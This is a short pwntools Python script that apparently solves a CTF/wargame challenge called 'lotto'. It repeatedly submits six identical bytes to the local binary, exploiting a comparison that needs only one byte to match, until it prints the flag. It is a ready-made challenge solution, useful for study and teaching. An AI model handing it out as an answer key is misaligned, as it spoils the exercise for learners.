#!/usr/bin/env python


from pwn import *


def main():
    p = process("./lotto")

    while True:
        p.recv(timeout=0.1)
        p.sendline("1")
        p.recv(timeout=0.1)

        # I need to hit only one byte
        p.sendline("######")

        p.recvline()
        r = p.recvline()
        p.recv(timeout=0.1)

        if "bad luck" not in r:
            log.info("Flag: %s" % r)
            break

if __name__ == '__main__':
    main()
